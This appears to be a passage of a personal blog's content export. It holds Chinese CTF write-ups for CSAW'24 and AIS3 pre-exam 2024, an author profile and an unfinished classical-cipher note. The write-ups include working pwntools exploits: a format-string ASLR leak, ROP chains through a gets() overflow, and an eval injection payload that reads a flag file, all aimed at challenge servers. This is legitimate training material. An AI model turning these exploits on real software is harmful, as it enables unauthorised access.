81177703223050327072826245731656444970746670962178893596866749248985055819064026711206591064102568684210270239031311552084894623247525907933925015980322475751964290174523048766068652767848785157128558417911661948655949158005943910504885480428658407000419115833416727420060 e = 65537 n1 = 849335341290886685305469218391857707731284340958190419070185843136010157709429053610422484475132681533748719098278969826215644874339472967353132551879455362882996907567507113593506825753079778590426114664641480816600384751471656645291232769230937136910355259284237110429149485567788006502323613635933685865306368710784061314928154920731534552117321317277211567493110152566489842583624729165341328622863262200606012259883201617700955694695922994087859464481658597983611169234466124699760530832690946886672455760158700223782288051380457731164725645861312489664513789670524826747778520365562211927266455463083486309711423210020471808741823123222068864708556581964581065834988620566447012299912244270348094665860535141932228229489208553114464044014430205989899364599981035118586030905442204839171480278940939019668106564678143657774136844418987220537475593181825555444917027626563850710659384061650161954669583365646428622075935490337721802367242209967740698482568921310122475447746639557770945332710012170102525879752975818050520509857439519049644785825032104077215376906019647567250546984958145151649505898444718072843209364124945650856086793772364425465519611908098951364026287867524069822425347155753599639554767185278129507433506309 n2 = 603523566530333849178340428498944902666363745873836128019046104968850160788559626859110536807737092301279190275717524103231817119850380847226716405338227641758799619075339058107790224618949070936355847696512320584610781171628029295879025358995297274114650904664397977445850692346888664395462514491694005594326981267020658004853078220869498716454480503670832534655687832674317698341533791287606520109612425394700304038251923496303824119858678564161604483027565550190673989872119144198248907235642586281776334255518772240197897432768870606595017185449736217266994920355907164372528751413042250719701199348091884608946014594175762002630845986429797454686315898064893067919327646448166242760968074216672400981626176888822037453360011497389835122764853203956625199041071100777042750119671525508293375356678113231545760621792785884810027728859682751883206526242837955866065528264740145465244712713969196077012700370049597156003550177262301319126400428989863912190142334126607178261626969803469625974325630891730058651069671841464378913213797770918193912221804892109419238634557345136168738280281615754564955678609409321720136879847520102473459064293144553235291623089686442091239836122526756636264103227262956791809160643363991596481281713 def rsa_decrypt(c, p, q): phi = (p - 1) * (q - 1) d = pow(e, -1, phi) return long_to_bytes(pow(c, d, p * q)) p = GCD(n2, n1) q1 = n1 // p q2 = n2 // p print(rsa_decrypt(c1, p, q1)) print(rsa_decrypt(c2, p, q2)) n1和n2有公因數，直接分解\nDiffusion Pop Quiz #\r這題他給了一個script，主要是在描述透過sbox擴散(diffusion)\n題目是問答題，只要達成他給的問題(實際執行一次)就可以拿到flag\nAES Diffusion #\r跟上題一樣，是要學AES diffusion\n||弄一弄就有flag了\u0026hellip;||\nReverse #\rBaby Rev #\r點點點就找到了\n拿去base64 decode\nMagic Tricks #\r逆向加密過程的題目\n把一段文字丟進去會得到一段亂碼叫做output.txt\n所幸相同相同輸入字元-\u0026gt;相同輸出字元\n只是輸出的字元編碼不是ascii\n但utf8可以用\n解題過程:\n程式中輸入所有可視字元，因為我們知道flag只可能用ascii可視字元組成 用python read output作為對照表 alphabet = \u0026#34;!\\\u0026#34;#$%\u0026amp;\u0026#39;()*+,-./0123456789:;\u0026lt;=\u0026gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~\u0026#34; output = open(\u0026#39;output.txt\u0026#39;, \u0026#39;r\u0026#39;, encoding=\u0026#34;utf-8\u0026#34;).read() cipher = open(\u0026#39;cipher.txt\u0026#39;, \u0026#39;r\u0026#39;, encoding=\u0026#34;utf-8\u0026#34;).read() #I renamed challenge\u0026#39;s output.txt to cipher.txt flag = \u0026#34;\u0026#34;.join(alphabet[output.index(ch)] for ch in cipher) print(flag) Pwn #\rDiving Into Null #\r一個壞掉的bash，沒有ls和cat，所以要自己手刻一個:\nls:\nfor f in *; do echo \u0026#34;File -\u0026gt; $f\u0026#34;; done ls -a:\nfor f in *; do echo \u0026#34;File -\u0026gt; $f\u0026#34;; done reference\ncat filename:\necho $(\u0026lt;filename) 然後在~/\n執行剛剛手刻的ls -a，可以看到.flag\n再執行\necho $(\u0026lt;.flag) 就可以得到flag了，||這什麼怪題||\nMini Golfing #\r這題有開ASLR，不能亂跳\n可以利用printf找到main的位置，然後算offset\nsolve:\nfrom pwn import * # context.arch = \u0026#39;amd64\u0026#39; # context.terminal = [\u0026#39;tmux\u0026#39;, \u0026#39;splitw\u0026#39;, \u0026#39;-h\u0026#39;] # # r = process(\u0026#39;golf\u0026#39;) # gdb.attach(r) r = remote(\u0026#39;golfing.ctf.csaw.io\u0026#39;, 9999) r.sendlineafter(b\u0026#39;? \u0026#39;, b\u0026#39;%171$p\u0026#39;) r.recvuntil(b\u0026#39;hello: \u0026#39;) start_addr = int(r.recvline().strip(),16) win_addr = start_addr - 0x223 + 0x209 print(hex(win_addr)) r.sendlineafter(\u0026#39;aim at!:\u0026#39;, hex(win_addr)) r.interactive() Nix Philosophies #\r看起來像是用C++的字串來混淆\n但程式功能如下:\n輸入字串 sum(自己取的) = 從第二個字元開始後的每個字元ascii相加 read(sum - 1603, buf, 32) 解法：\nfd(0)是stdin，所以就可以控制buf了\naaaaaaaaaaaaaaaaa3的sum=1603 -\u0026gt; fd是0\n輸入make every program a filter\n就可以得到flag了，這次比賽都沒正常的pwn:(\n","date":"2024-09-09","externalUrl":null,"permalink":"/writeups/csaw-2024/","section":"Writeups","summary":"intro #\rranking #\r總排名193/1184|TOP 16%","title":"CSAW'24 CTF Writeup","type":"writeups"},{"content":"\r前言 #\r先不說是不是用運氣打的(那題pwn是我半夜夢到解法起床解的)\n題目蠻有趣的，值得參加\nMisc #\rwelcome #\r複製貼上\nQuantum Nim Heist #\r首先move完一顆後，接下來如果讓你選擇，而你選擇0~2以外的選項\n伺服器就會當作你有做過操作了，但你其實沒有\n所以現在只有ai再取石頭\n等到ai取到剩下一排，把那一排取掉就可以獲勝得到flag\nThree Dimensional Secret #\r開啟的封包檔，前面一一個Cura_SteamEngine 5.6.0 找到Cura SteamEngine後，發現這是一個3d列印軟體 把這個tcp stream改成副檔名.gcode後 再用Cura SteamEngine該起就有flag了 Emoji Console #\rflag是一個資料夾 拿到app.py和Emoji、command的對照表 flag裡面由一個flag-printer.py 執行並得到flag\nCrypto #\rbaby RSA #\r從source code可以知道他是針對每個字元進行加密的 所以只要爆破就可以得到flag了\nflag = [59582983136368434856816799733313446746433796034384724221174424464969737874802116129348607979328098841766335449896610931770063087921739964156335144291643702667891887833963756948394265219864837961748202920096128332905237576243643095664147826020400199347355043162641743846198725931842313977049712473768688780204, 95359547394031742813518330673269556403528254059894407470006786975603938062435320319282644182444182438612748874603359501010449113346386193598111715879103479311697744375488228536365895249959983701008182395138745363343749821348881488616739650767615867269542213617639437927373484681942750228038458670913761461906, 46329325300279098651694178842591774415260876326218182283454895682597312145324055490326488805186682301528705330448500034219715636964856131530973835780285303243952273742119154142469279746360304190118988650200422700136950019141246372634642054318988506247030406078971388938494583721698317950574261574174233878465, 99372516099607712778908802720080113062724120782160998443385643772511391370661101893707293382044546993124605549696368316348952556779713164710839853078160450782104255053788389238478472574549113909833434906535103012424826026640284958298083646000213492094244631381094489147645893989473799375006911204994971262513, 76560888147807476608165550435978536197327212318831455594999273843368454289391559274947371380742007729563677938535717707232627424457601159959128489070947748904688640279908482263289424669338790488996485849079890881530740377280113682547250364463080771156212510360194563192123664613212111565777733487081937952558, 12319813533472769541026063795801870849236715810997656653501875874806446093919930377755747066386074676697058702735112064576219731845584108035461434499628574742399407498867908576045220515065246483998134315307132901329833371485817530138131352593805641664023978795298886913968639954517583992930243922021434381738, 96951009388162450018398074248238612521098089563081241061172635732154749686698900516806076917644927142046116130006730586770841058020946718314769404592479949673385387831784647829787593435525861689652400487918043078535385527278516028607916478700007746817161408140805937414915909575928550204945457887011906141614, 1665805297521640119669919457094144711238099413231800824465470812913880572669116305626521524153911904267238129531937952423409222225023467794927666422627082314285814656075569814644205638687105792760533211008966815918943917251927254624389871965679206262024216136163262412286874416732008465838711695063592124435, 38031617734525236754862788270684927634041250565347090806313746312968815507316236887544784308484734926981400017478758364119367924220519253824976349577671434162884831759762106665665138444165001645856871491952279748415831766579735400499998753646766301606966507940299051979075677572064596983713461662607114250263, 64855027109789931203406858899259092299626327163376469398846102754805420506427252072315662287801006608894162707199492268892939811482863649987034183371607590158980649349849687594118554925649076468007225363531072941142253057862686631842080812159597499430107963982315266135241847383726503265496996481889717246182, 38285633551521777138710771085033430239170710707266775875598456653892976969437761922968925746226073683095654278272586779539831402373205526909772633370025848937463033570747721110932401276480992827694564074802181306738438015295515798739406061377284368603543443076476369810597345436481251791260803352288977423573, 90968383857681404242927909477464252602387471219945950453665598772039832078487309149670692874283215437984574695320981806360379096212936326954111131608499584545969103096096842380877613033764006459107764277330135816044808210474597200172673683909558627722941503504083244424751773797618360290613996970960151563724, 95457298055868694391877219138576497445115151186056513418820503159496876268497080831408725541436969299827723238663173668798694515208450035233192338795425824459299174728295661096981248839235055855929604893139239340445385259232905864515397406993189217322907168121716905101208450279521267289056195400878302077398, 52468135911274945777529136529541932989316502665934748207836694395110108517204287366878248216053327656034128346107236076714109214143042824050810182510919475258788845504651287598248217763885663385525333584236650693667648746329707103824387098563158188013686337454772275459145419197015884603853408230553227896407, 34661612116812273325510815885632987773878634626625747042958636362152583931260969561869719786378247664638641161656878412129162010084766438156247296031040184022246208883138926132649114007757242227131459285251878118564710945280013332131793855359773876332415772442620349609897435915019325055421286197078708187352, 52468135911274945777529136529541932989316502665934748207836694395110108517204287366878248216053327656034128346107236076714109214143042824050810182510919475258788845504651287598248217763885663385525333584236650693667648746329707103824387098563158188013686337454772275459145419197015884603853408230553227896407, 72893301186321303683272295658327353212060838237559048917336264819112421968115615005989580760612444279776561566669272155758039717810976344470895667733780292960024364644216982543515945404550612735708418065359731237914621596888496631385879381090937225999965270114589266587955012094766794851372212812150698234716, 67602482196856820166971428403758405739455475263382367621161896414339370625380754447863410276767241406699969322350803814348655243066328706656427717483623041308690996376549835317954286006923639192767262817817435759143930376297271756237829141630002480289781731985465743331200468015517012225741723423203374827341, 44262354102194743351911268289256770008339497245528544280709170541530088518398751380655719846628700171065092804544687718896291531970838072744874705570156704628202662829757806782131182294252555844059856971743311355891113953747318316062265029166813195656690004051327523203179399349334322871113218009692321746302, 52468135911274945777529136529541932989316502665934748207836694395110108517204287366878248216053327656034128346107236076714109214143042824050810182510919475258788845504651287598248217763885663385525333584236650693667648746329707103824387098563158188013686337454772275459145419197015884603853408230553227896407, 17525442355443739006798161136945234538289135293732159010469949341666347513585837371870704355037863634098163883611042121878362686860890223724238562583526550649340086051319234134907577624853632886715848962127706255769976443912657070070366400669740596805962173530384420842637554803041466900119050709458062167550, 44014841046589017601891983719958867760419600204352901036629548332837496204051161377933425345536644034794916246706885620488552830053604204333015893225255398323167834260921720336325397193593333461140140475610284003097590899522403244883330800589948361851693870192559674072749868797979125684663605722325053340834, 52468135911274945777529136529541932989316502665934748207836694395110108517204287366878248216053327656034128346107236076714109214143042824050810182510919475258788845504651287598248217763885663385525333584236650693667648746329707103824387098563158188013686337454772275459145419197015884603853408230553227896407, 32463563387229396502994321924065961632284043136468238906625180045736135155253223928723914405824284085442712712337348213915399745045346853697650399659292339726614512642835897683094877670342609027803404027945312939777902664125228095034970967750466928999176126534504349068649205422848461193336320361026425455874, 72893301186321303683272295658327353212060838237559048917336264819112421968115615005989580760612444279776561566669272155758039717810976344470895667733780292960024364644216982543515945404550612735708418065359731237914621596888496631385879381090937225999965270114589266587955012094766794851372212812150698234716, 12179738687529782107447590339149361896936551322934825418520525165858885435598866363152322677187041910693780230742925050834968940508546403788452893248148672885195158450001568668626998159030042932978014971079411358732702590558133373478956077176801426446288446920254354063720982962966912703174841575095158773376, 101125682339799901828662987568918086070282069568379908090074247169217184659644669626554838396604623590909101664987452894437649857681299514293609000818253780343589956828098266778252516930801354335366245918603834198786544373944956666900784678369416240212915856834107510529441463083826031881209805666209335413628, 101403644290884991310189664359755656780537902543354415482434580937410695343294757120985680350019917171639284125327989098680673553323894980248499865788837636944758311200094760909373728675822272584823764964753326309765279310435693879623302965536053211433064599526550676915084290753201910772032395483945950367273, 24333051506853181360030701569319128673885779416125109480872653360245763695810807795571148802002658160356587851857338891650119080260776136984074861612952869696123011417276568821410663401888348228549042676235853145756762295087473309782699704381451505573652641489540319626561348999020895690560418530256831740666, 20222920908058605457111970272150612273139460769260447235596498596781683961010128426184024637706564546340327246191020540223566835757304493325371606037680402571948650998523099138137441154209281794538860160477031997660506452095283151142470607354579609545040759974018408429796935802188551530478970289514572978617, 72893301186321303683272295658327353212060838237559048917336264819112421968115615005989580760612444279776561566669272155758039717810976344470895667733780292960024364644216982543515945404550612735708418065359731237914621596888496631385879381090937225999965270114589266587955012094766794851372212812150698234716, 32184464000490155748453165982143565340499464338829080683417468389784993809512708479494827939476307049612151190695993375700147700844413744001417893095868641387694266647992101758785355055413538046252854525860440227182911367045556141460084455472907278113962890024281663648508886642376786194323597791020547317088, 101125682339799901828662987568918086070282069568379908090074247169217184659644669626554838396604623590909101664987452894437649857681299514293609000818253780343589956828098266778252516930801354335366245918603834198786544373944956666900784678369416240212915856834107510529441463083826031881209805666209335413628, 44014841046589017601891983719958867760419600204352901036629548332837496204051161377933425345536644034794916246706885620488552830053604204333015893225255398323167834260921720336325397193593333461140140475610284003097590899522403244883330800589948361851693870192559674072749868797979125684663605722325053340834, 12179738687529782107447590339149361896936551322934825418520525165858885435598866363152322677187041910693780230742925050834968940508546403788452893248148672885195158450001568668626998159030042932978014971079411358732702590558133373478956077176801426446288446920254354063720982962966912703174841575095158773376, 63634815088527144255090148113948593793648445499224983027630191877159813968754095341812467946868079279626991968747689424489021633678743106301884613005477044402324870044751927862596590687251830485165119422247449722579599610918927243419033509419967393677988976255284611384351411782311379786356079256916831362626, 9304987377904341606117201715658113065608581640101320211543462955469900806281721467187032121463132314663326494170970278379001634044806680348131292368949519512445580695938064509920503814133961673755470696223243390646274004621955993274826096679460577701554059204349111764901921932386091658007427259226167178177, 58828925452729811932976588739787965824652220690551333824296205824127538696058603108169405357158211350616510470513672533759883740745736322687898383422522330915631984810878357007178714597068087752425823728826608887027664209314455243118645386520598961325656254330576959063500755210398248129074822706590225088700, 72893301186321303683272295658327353212060838237559048917336264819112421968115615005989580760612444279776561566669272155758039717810976344470895667733780292960024364644216982543515945404550612735708418065359731237914621596888496631385879381090937225999965270114589266587955012094766794851372212812150698234716, 32184464000490155748453165982143565340499464338829080683417468389784993809512708479494827939476307049612151190695993375700147700844413744001417893095868641387694266647992101758785355055413538046252854525860440227182911367045556141460084455472907278113962890024281663648508886642376786194323597791020547317088, 72893301186321303683272295658327353212060838237559048917336264819112421968115615005989580760612444279776561566669272155758039717810976344470895667733780292960024364644216982543515945404550612735708418065359731237914621596888496631385879381090937225999965270114589266587955012094766794851372212812150698234716, 12179738687529782107447590339149361896936551322934825418520525165858885435598866363152322677187041910693780230742925050834968940508546403788452893248148672885195158450001568668626998159030042932978014971079411358732702590558133373478956077176801426446288446920254354063720982962966912703174841575095158773376, 38031617734525236754862788270684927634041250565347090806313746312968815507316236887544784308484734926981400017478758364119367924220519253824976349577671434162884831759762106665665138444165001645856871491952279748415831766579735400499998753646766301606966507940299051979075677572064596983713461662607114250263, 42674155454878392842592499423860033988264245394501952163129442865919203299671995689679354090226093903765768139477289952989042795959374257614752953563152551974557414325407858919156902405925850703390450181868760242922958259454422450849566085988801215229822701373233313619020572460459663094142218119144686335871, 101125682339799901828662987568918086070282069568379908090074247169217184659644669626554838396604623590909101664987452894437649857681299514293609000818253780343589956828098266778252516930801354335366245918603834198786544373944956666900784678369416240212915856834107510529441463083826031881209805666209335413628, 75918055185950026238164530295762591705002247585433355113315303142207464051952569831664550604622541858093495062851840811257603174544255151597115446984458237694842739071530518936317606199598953518976167711716762043806043449827887577909963803673508838826582484003687958862302989732473748700329398645880243054148, 52468135911274945777529136529541932989316502665934748207836694395110108517204287366878248216053327656034128346107236076714109214143042824050810182510919475258788845504651287598248217763885663385525333584236650693667648746329707103824387098563158188013686337454772275459145419197015884603853408230553227896407, 42674155454878392842592499423860033988264245394501952163129442865919203299671995689679354090226093903765768139477289952989042795959374257614752953563152551974557414325407858919156902405925850703390450181868760242922958259454422450849566085988801215229822701373233313619020572460459663094142218119144686335871, 52468135911274945777529136529541932989316502665934748207836694395110108517204287366878248216053327656034128346107236076714109214143042824050810182510919475258788845504651287598248217763885663385525333584236650693667648746329707103824387098563158188013686337454772275459145419197015884603853408230553227896407, 47953002091054578020381201294163023730809574731463958773592358719441988187452655748118051277286650853337305718192021972814357369747332979634917684999259838316305009239963225119133204824897098152777119627043881500966537112886938182847527574241215915396651397126350467492479189194162628876529519538265140143596, 101403644290884991310189664359755656780537902543354415482434580937410695343294757120985680350019917171639284125327989098680673553323894980248499865788837636944758311200094760909373728675822272584823764964753326309765279310435693879623302965536053211433064599526550676915084290753201910772032395483945950367273, 52468135911274945777529136529541932989316502665934748207836694395110108517204287366878248216053327656034128346107236076714109214143042824050810182510919475258788845504651287598248217763885663385525333584236650693667648746329707103824387098563158188013686337454772275459145419197015884603853408230553227896407, 107340541989905757204370662416845552037146078905222935505789033122562501577684655501092154588544305605078885306044047839464564901594898750722560559313996616820973286189602827331851868376927628179028545097753144658073207307785378721899783095713473789007231709234504050418717400729711972350669632384570468096830, 43967923748936484351732805873555964174712775706889811180819474140612599586161884530658035908721232399384729457223641995556425707839305124083600738135036620220298476686325110132022730675370888898063942501477522619906479683016701151321856269078215479158146009655223314957908787521092587379267241203076718674092, 24333051506853181360030701569319128673885779416125109480872653360245763695810807795571148802002658160356587851857338891650119080260776136984074861612952869696123011417276568821410663401888348228549042676235853145756762295087473309782699704381451505573652641489540319626561348999020895690560418530256831740666, 20472445493228441292721090614657967895462252302228260568752427996680563809601852655319833688134475798137834395223726607334321531235376774219216055134601030184130917876549113091114144486261794932716233808194664233936783735663266743029212488020840969559603523111887524998658108503660068448898570323437482810017, 72893301186321303683272295658327353212060838237559048917336264819112421968115615005989580760612444279776561566669272155758039717810976344470895667733780292960024364644216982543515945404550612735708418065359731237914621596888496631385879381090937225999965270114589266587955012094766794851372212812150698234716, 64855027109789931203406858899259092299626327163376469398846102754805420506427252072315662287801006608894162707199492268892939811482863649987034183371607590158980649349849687594118554925649076468007225363531072941142253057862686631842080812159597499430107963982315266135241847383726503265496996481889717246182, 52468135911274945777529136529541932989316502665934748207836694395110108517204287366878248216053327656034128346107236076714109214143042824050810182510919475258788845504651287598248217763885663385525333584236650693667648746329707103824387098563158188013686337454772275459145419197015884603853408230553227896407, 75918055185950026238164530295762591705002247585433355113315303142207464051952569831664550604622541858093495062851840811257603174544255151597115446984458237694842739071530518936317606199598953518976167711716762043806043449827887577909963803673508838826582484003687958862302989732473748700329398645880243054148, 12708160939460449797746334640370189741594393156198590130563300705594742285274155378452384449752817944962371880018673966875751948953034846634284138305820292201281595210265881917297911731564408181887226462606892964361033320116765426523499831287478314065882300932476595216136350756971622192468975464823677154324, 52745488365658861485519010696623986434656675831322149607647058389953842185045922621964255927212518970223978973817292179059730382537814695353016058702226289640834171560498112170760826276332972100423555174686162215383841925656596984188536350046664199627214379076416024495451320834231863438007383528385204646269, 8855798603366167912634233401398286651752671525801140525178611090639905433230380535711326462952071294452556819384200831430822862220907470038589552641363759764881881084119960616686113091264272665290715332905431138686504873774368450566561688814993821800992967990682116846800657243011069696481920893909247794983, 96951009388162450018398074248238612521098089563081241061172635732154749686698900516806076917644927142046116130006730586770841058020946718314769404592479949673385387831784647829787593435525861689652400487918043078535385527278516028607916478700007746817161408140805937414915909575928550204945457887011906141614, 3085377115073481737487767519304315808353144937670566256348398664810936964565637157736537945459712875615504238408907602974507381828272609303797146395233485026377776965939508974096385939172942695211339651597248692728550782246178293579153110379844451779466255357619524290412118137515779354431956948078394927940, 48345447683174081443502925378502329908064423944850311779861406407783604557812792515281621715817536127803162311234459315836524837064977025182379655213338205159741266326939713833052921255157742860610743189155260503439836583887313584730345974553768985184119012533854386867355018502198395672167297716386558437643, 2943509185067047938273565758747957807917637430462018374124947856251091022696853505230975399503014099411245162812979057344198094444949853114144790397928000334361276864689352349519363636219566973775714458213611238774130167222835759501223813455853370320854862131109567941072112035263351158877256955712543549605, 76560888147807476608165550435978536197327212318831455594999273843368454289391559274947371380742007729563677938535717707232627424457601159959128489070947748904688640279908482263289424669338790488996485849079890881530740377280113682547250364463080771156212510360194563192123664613212111565777733487081937952558] e, n = (64917055846592305247490566318353366999709874684278480849508851204751189365198819392860386504785643859122396657301225094708026391204100352682992979425763157452255909781003406602228716107905797084217189131716198785709124050278116966890968003294485934472496151582084561439957513571043497031319413889856520421733, 115676743153063753482251273007095369919613374531038288437295760314264647231038870203981488393720761532040569270340726478402172283300622527884543078194060647393394510524980830171230330673500741683492143805583694395504141751460090539868114454005046898551218623342425465650881666420408703144859108346202894384649) for ch in flag: for i in range(128): if pow(i, e, n) == ch: print(chr(i), end=\u0026#34;\u0026#34;) break WEB #\rEvil Calculater #\r題目會執行你送出的post的資料，並回傳執行結果(過濾掉底線和空白)\npayload: open(\\\u0026quot;../flag\\\u0026quot;).read() 丟到burp即可 PWN #\rMathter #\r把goodbye()函數decompile之後可以發現這邊有一個gets()函數 可以利用這點跳到win1()和win2() 跳到win1()之後，函數會要求第一個引數的值為0xdeadbeef\n這時要利用ropchain:\npop rax; ret; 0xdeadbeef win1_addr 同理win2()會要求函數第一個引數的值為0xcafebabe\npop rax; ret; 0xcafebabe win1_addr source code:\nwin1 #\rfrom pwn import * context.arch = \u0026#34;amd64\u0026#34; context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] # r = process(\u0026#34;./mathter\u0026#34;) r = remote(\u0026#34;chals1.ais3.org\u0026#34;, 50001) # gdb.attach(r) win_addr = 0x4018d0 rbp_addr = 0x4bd000 pop_rdi_ret = 0x402540 rop = flat( pop_rdi_ret, 0xdeadbeef, win_addr ) payload = b\u0026#34;aaaa\u0026#34; + pack(rbp_addr, 64) + rop print(r.sendlineafter(b\u0026#34;Enter an operation and two numbers (e.g., 1 + 1) :\u0026#34;, b\u0026#34;q\u0026#34;).decode()) print(r.sendlineafter(b\u0026#34;Are you sure you want to leave? [Y/n]\u0026#34;,payload).decode()) r.interactive() win2 #\rfrom pwn import * context.arch = \u0026#34;amd64\u0026#34; context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] # r = process(\u0026#34;./mathter\u0026#34;) r = remote(\u0026#34;chals1.ais3.org\u0026#34;, 50001) # gdb.attach(r) win_addr = 0x4019A2 rbp_addr = 0x4bd000 pop_rdi_ret = 0x402540 rop = flat( pop_rdi_ret, 0xCAFEBABE, win_addr ) payload = b\u0026#34;aaaa\u0026#34; + pack(rbp_addr, 64) + rop print(r.sendlineafter(b\u0026#34;Enter an operation and two numbers (e.g., 1 + 1) :\u0026#34;, b\u0026#34;q\u0026#34;).decode()) print(r.sendlineafter(b\u0026#34;Are you sure you want to leave? [Y/n]\u0026#34;,payload).decode()) r.interactive() 可以得到flag的前後段\nREV #\rThe Long Print #\rdecompile後會sleep 0x3674 秒\n可以先設斷點 在跑到斷點的時候可以編輯Assemble 把數字改成0 刪除的斷點，在printf後設斷點， 慢慢的按continue就可以一個字一個字的得到flag\n火拳のエース #\r從decompile後的偽c代碼，可以得知祕密的字串長度是24\n並將字串拆成4段，並對其進行xor運算和複雜運算\nxor的key\n只要把byte提出來爆搜就可以得到flag(後段)了，前段可以在.rodata找到\n解法\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026#34;defs.h\u0026#34; void xor_strings(char str[], char key[]) { for (int i = 0; i \u0026lt;= 7; ++i) { str[i] ^= key[i]; } } int complex_function(int a1, int a2) { int v2; // eax int v4; // [esp+8h] [ebp-10h] int v5; // [esp+Ch] [ebp-Ch] if (a1 \u0026lt;= 64 || a1 \u0026gt; 90) { puts(\u0026#34;It feels slightly wrong, but almost correct...\u0026#34;); exit(1); } v5 = (17 * a2 + a1 - 65) % 26; v4 = a2 % 3 + 3; v2 = a2 % 3; if (a2 % 3 == 2) { v5 = (v5 - v4 + 26) % 26; } else if (v2 \u0026lt;= 2) { if (v2) { if (v2 == 1) v5 = (2 * v4 + v5) % 26; } else { v5 = (v4 * v5 + 7) % 26; } } return v5 + 65; } int main() { char buf[32] = \u0026#34;AAAAAAAA\u0026#34;; char ans[32] = \u0026#34;DHLIYJEGMZRERYNDRUYODBAHBKEMPBRE\u0026#34;; char key[32] = { 0x0E, 0x0D, 0x7D, 0x06, 0x0F, 0x17, 0x76, 0x04, 0x6D, 0x00, 0x1B, 0x7C, 0x6C, 0x13, 0x62, 0x11, 0x1E, 0x7E, 0x06, 0x13, 0x07, 0x66, 0x0E, 0x71, 0x17, 0x14, 0x1D, 0x70, 0x79, 0x67, 0x74, 0x33, }; for (int k = 0; k \u0026lt; 4; k++) { for (int i = 0; i \u0026lt; 8; i++) { for (int j = 0; j \u0026lt; 256; j++) { int try_n = j ^ key[i + k * 8]; char a; if (try_n \u0026gt;= 65 \u0026amp;\u0026amp; try_n \u0026lt;= 90) a = complex_function(try_n, i + k * 32); else continue; if (a == ans[i + k * 8]) { printf(\u0026#34;%c\u0026#34;, j); break; } } } } } ","date":"2024-06-06","externalUrl":null,"permalink":"/writeups/ais3-pre-exam/","section":"Writeups","summary":"前言 #\r先不說是不是用運氣打的(那題pwn是我半夜夢到解法起床解的)","title":"AIS3 pre-exam 2024 writeup","type":"writeups"},{"content":"\rwhoami #\r我在社群上用的名字是 Dr.dog，目前高二\n常打 ctf，主要玩 reverse 和 crypto，pwn 也有練過一陣子\nHow to find me #\r有事可以在 dc 找到我，id:hokak_，加好友之前稍微自我介紹一下就 ok 了\n比較正式的事可以找我 email(頭像下方)\nBlog #\r建立 blog 的契機是因為懶得自我介紹\n痾我需要一個 blog 來放筆記、Writeup\n比賽的時候 copy 自己的起來比較快\n網站架構是用 Hugo \u0026amp; Blowfish\n喔對，背景都是來自蒼之彼方四重奏，蠻推這遊戲的\nExperiences #\rCTF experiences #\rCTFtime (solo) #\r項目 隊名 名次 2024 ACSC CTF 2024 hokak 152 2024 CSAW'24 CTF hokak 193/1184 2024 DEADFACE CTF 2024 hok4lc 118/1215 2024 niteCTF 2024 hok4lc 93/1174 CTFtime (with ICEDTEA) #\r2024 Imaginary CTF ICEDTEA 61/1457 2024 PatriotCTF 2024 ICEDTEA 33/1360 2024 Iron CTF 2024 ICEDTEA 121/1033 2024 sunshine CTF ICEDTEA 61/642 國內 #\r2024 THJCC 臺灣高中聯合資安競賽 THJCC_hokak 2 2024 AIS3 pre-exam hokak 42 2024 Scist 4th final CTF SCIST_18 1 2024 CGGC 網路守護者挑戰賽 初賽 金爐香盡漏聲殘，我只剩下半顆肝 7 2024 CGGC 網路守護者挑戰賽 決賽 金爐香盡漏聲殘，我只剩下半顆肝 6 Competitve Programming #\r2023 APCS 3/3 2024 APCS 4/4 2024 HSPC 決賽 Activities #\r2023 SCIST 4th 學員 2024 TFcis 網管組，資安教學(? 2024 臺南一中國中生程式設計營 基礎班講師 2024 ICEDTEA(實中資安) 戰隊成員 2024 AIS3 學員 2024 B33F 50μP(成大資安社) 戰隊成員 2024 臺灣好厲駭 9th 學員 2024 THJCC 2024 winter 出題者 ","externalUrl":null,"permalink":"/about/","section":"Homepage","summary":"whoami #\r我在社群上用的名字是 Dr.","title":"About","type":"page"},{"content":"","externalUrl":null,"permalink":"/notes/algo/","section":"Notes","summary":"","title":"Algo","type":"notes"},{"content":"","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"\rIntro #\r因為不想一直通靈所以打算做一篇古典密碼的筆記\n古典密碼通常會使用替換式或移項式的加密方式\n容易被頻率分析或暴力搜索破解\nSubstitution Cipher(替換式密碼) #\r字母位置不變，但透過以一個字母到兩個字母為一組，進行加密\nCasear Cipher(凱薩密碼) #\r加密 #\r會把每個字母同時位移\n比如說若KEY = 1\nABCDE -\u0026gt; BCDEF\n項目 值 明文 THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG 密鑰 13 密文 GUR DHVPX OEBJA SBK WHZCF BIRE GUR YNML QBT 解密 #\r反過來做就好了，這種加密方式很容易爆破\n實作 #\ralphabet = \u0026#39;ABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#39; def encrypt(plaintext:str, key:int)-\u0026gt;str: cipher = \u0026#34;\u0026#34; for ch in plaintext: if ch.upper() in alphabet: pos = alphabet.index(ch.upper()) ch = alphabet[(pos + key) % 26] cipher += ch return cipher def decrypt(cipher:str, key:int)-\u0026gt;str: plaintext = \u0026#34;\u0026#34; for ch in cipher: if ch.upper() in alphabet: pos = alphabet.index(ch.upper()) ch = alphabet[(pos + key) % 26] plaintext += ch return plaintext if __name__ == \u0026#39;__main__\u0026#39;: cipher = encrypt(\u0026#39;THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG\u0026#39;, 13) plaintext = decrypt(cipher, 13) print(cipher) print(plaintext) Vigenère Cipher(維吉尼亞密碼) #\r明文和都是字串，密鑰是循環的\n加密 #\r把密鑰的單個字元當作offset，A=0,B=1,C=2,etc.\n項目 值 明文 THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG 密鑰 ABCD 密文 TIG TUJEN BSQZN GQA JVOSS PXHR UJH LBBB DPI 解密 #\r反過來做就好了\n密碼破譯，工具:\n卡西斯基試驗:當相同的字母序列在密文中重複出現，中間的間隔可能是密鑰長度 弗里德曼試驗:密文中的字母會出現不同頻率，可以通過計算密文的重合指數，來獲得密鑰長度 重和指數:\n$$ \\kappa_{o} = 